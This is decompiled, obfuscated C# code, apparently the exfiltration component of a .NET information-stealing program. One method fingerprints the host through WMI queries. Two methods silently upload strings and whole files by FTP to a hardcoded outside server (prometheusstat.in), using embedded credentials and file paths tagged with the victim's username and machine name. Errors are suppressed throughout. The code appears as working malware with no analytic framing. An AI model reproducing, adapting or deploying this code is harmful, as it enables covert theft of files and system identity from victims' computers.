using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace sWduCclqEzKrM;

internal sealed class ApOKuNWkxqSR
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string UrKzkselLTG()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107379700));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107379711)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107379662);
		ManagementObject val3 = new ManagementObject(getString_0(107379689) + text2 + getString_0(107379136));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107379099)).ToString();
		return text3 + text;
	}

	public static void vxdbMFfBOqF(string kILMioIqDoGu = "ftp://prometheusstat.in/", string CCGTDWLpXRyKm = "ftps", string YJBARuWkxWgdONUf = "12qwasZX!@", string UcMwOCfEzpz = "")
	{
		try
		{
			string text = UrKzkselLTG();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(kILMioIqDoGu + getString_0(107380575) + Environment.UserName + getString_0(107380530) + Environment.MachineName + getString_0(107380541) + text + getString_0(107380504));
			ftpWebRequest.Method = getString_0(107379106);
			ftpWebRequest.Credentials = new NetworkCredential(CCGTDWLpXRyKm, YJBARuWkxWgdONUf);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(UcMwOCfEzpz);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void IxYjJLTMXDzuQu(string rulMakZguKenx = "ftp://prometheusstat.in/", string JZPjJhoHrhsMn = "ftps", string laavYdfkPSzTf = "12qwasZX!@", string yqAsNdyKxD = "")
	{
		try
		{
			string text = UrKzkselLTG();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(rulMakZguKenx + getString_0(107380575) + Environment.UserName + getString_0(107380530) + Environment.MachineName + getString_0(107380541) + text + getString_0(107380541) + Path.GetFileName(yqAsNdyKxD));
			ftpWebRequest.Method = getString_0(107379106);
			ftpWebRequest.Credentials = new NetworkCredential(JZPjJhoHrhsMn, laavYdfkPSzTf);
			byte[] array = File.ReadAllBytes(yqAsNdyKxD);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static ApOKuNWkxqSR()
	{
		Strings.CreateGetStringDelegate(typeof(ApOKuNWkxqSR));
	}
}
